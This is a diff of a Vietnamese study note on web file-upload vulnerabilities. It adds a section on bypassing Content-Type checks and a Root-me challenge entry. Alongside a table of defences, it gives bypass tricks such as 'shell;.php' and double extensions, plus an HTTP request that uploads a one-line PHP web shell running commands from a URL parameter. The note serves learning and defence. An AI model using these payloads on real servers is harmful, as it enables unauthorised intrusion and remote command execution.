@@ -47,8 +47,8 @@
 | **Thiếu kiểm tra cho file kịch bản khác**         | Upload shell với phần mở rộng `.jsp`, `.asp` nếu server hỗ trợ           |
 | **Chỉ lọc ký tự một phần tên file**               | Upload `shell;.php` để qua mặt bộ lọc nếu server chỉ kiểm tra `.php`     |
 
-### Preventing file execution in user-accessible directories
 - Ngăn chặn việc thực thi file trong các thư mục người dùng có thể truy cập là biện pháp quan trọng nhằm bảo vệ ứng dụng khỏi việc kẻ tấn công lợi dụng các file độc hại để xâm nhập hệ thống. Khi thực hiện đúng cách, các biện pháp này sẽ giúp giảm thiểu rủi ro từ các lỗ hổng upload file và tránh các cuộc tấn công thông qua web shell hoặc các mã độc khác.
+- Dưới đây mình có một số phương pháp có thể ngăn chặn việc thực thi file.
 
 | **Phương Pháp Ngăn Chặn Thực Thi File**       | **Mô Tả**                                                                            | **Ví Dụ**                                                                 |
 |-----------------------------------------------|--------------------------------------------------------------------------------------|---------------------------------------------------------------------------|
@@ -62,6 +62,36 @@
 | **Đổi tên file hoặc lưu trữ ở dạng mã hóa**   | Đổi tên file upload thành chuỗi ngẫu nhiên hoặc lưu trữ file dưới dạng mã hóa để giảm khả năng thực thi. | Đổi tên `shell.php` thành `a1b2c3.tmp` khi lưu trữ                         |
 | **Sử dụng sandbox hoặc container hóa**        | Cách ly thư mục upload trong một môi trường ảo để ngăn chặn mã độc lan truyền.     | Chạy thư mục upload trong Docker với các quyền hạn chế                     |
 
+
+## Flawed file type validation (Xác thực loại file không chính xác)
+
+- Một web cho phép ta dùng tải lên file, server có thể kiểm tra header `Content-Type` của file đó để xác định loại file hợp lệ. Tuy nhiên, nếu chỉ kiểm tra header này mà không kiểm tra thực sự nội dung file, kẻ tấn công có thể lợi dụng lỗ hổng này để tải lên các file độc hại có phần mở rộng khác biệt.
+
+### Cách thức bypass:
+Kẻ tấn công có thể sửa header `Content-Type` trong request HTTP để thay đổi loại MIME mà server nhận diện. Ví dụ:
+- Upload một file `.php` dưới dạng `image/jpeg` để server không nhận diện được nó là PHP script và cho phép tải lên.
+- Công cụ như **Burp Suite** có thể giúp thay đổi trực tiếp `Content-Type` khi gửi request.
+
+- Ví dụ như giả sử bạn muốn upload một script PHP có tên `exploit.php`. Bạn có thể gửi request HTTP với `Content-Type` là `image/jpeg` thay vì `application/x-php`.
+
+```plaintext
+POST /upload HTTP/1.1
+Host: example.com
+Content-Type: multipart/form-data; boundary=------------------------abcdef123456
+
+------------------------abcdef123456
+Content-Disposition: form-data; name="file"; filename="exploit.php"
+Content-Type: image/jpeg
+
+<?php system($_GET['cmd']); ?>
+------------------------abcdef123456------------------------
+```
+
+- Nếu server chỉ kiểm tra Content-Type mà không kiểm tra đúng nội dung file, file PHP này vẫn có thể được upload thành công.
+
+## Preventing file execution in user-accessible directories (Ngăn chặn thực thi file trong thư mục người dùng có thể truy cập)
+
+- web ngăn không cho các file tải lên thực thi trong thư mục người dùng có thể truy cập được bằng cách giới hạn MIME types được xử lý. Tuy nhiên, nếu cấu hình không cẩn thận, một số file có thể vẫn được thực thi dù không nằm trong thư mục có cấu hình bảo mật.
 ## Root-me
 ### File upload - Double extensions
 - Với chall này ta chỉ cần thay đổi đuôi mở rộng thành `.php.png` là có thể by pass được.
